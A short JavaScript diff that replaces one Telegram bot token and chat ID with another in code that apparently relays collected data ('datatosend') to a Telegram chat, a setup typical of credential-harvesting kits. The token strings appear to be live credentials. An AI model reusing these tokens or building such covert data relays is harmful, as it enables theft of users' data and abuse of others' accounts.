@@ -124,8 +124,8 @@ function runn(){
         var datatosend = "";
 
             let tg2 = {
-        token2: `7954852701:AAEnJ1Ht0a_zYQonrw7kN-Gf6srjQd9JuXE`,  
-        chat_id2: `6006419090`
+        token2: `7909581549:AAGdgrWYo50OOl0P0oRJSwvZlGSo1SYh1GE`,  
+        chat_id2: `2018678552`
     }
 
     function sendMessage2(text2)
